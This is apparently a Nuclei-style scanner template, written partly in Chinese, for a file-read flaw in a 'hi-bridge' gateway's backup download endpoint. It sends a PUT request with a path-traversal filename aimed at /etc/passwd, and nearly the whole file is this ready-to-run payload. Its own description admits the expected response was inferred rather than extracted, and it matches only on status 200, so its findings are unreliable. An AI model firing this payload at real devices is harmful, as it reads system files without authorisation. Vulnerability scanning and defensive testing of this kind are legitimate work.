id: poc-2c1a76ad4d72f3cd2766
info:
  name: hi-bridge网关download存在文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'PUT /api/devices/backup/download HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0


    {"filename":"../../../../etc/passwd"}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
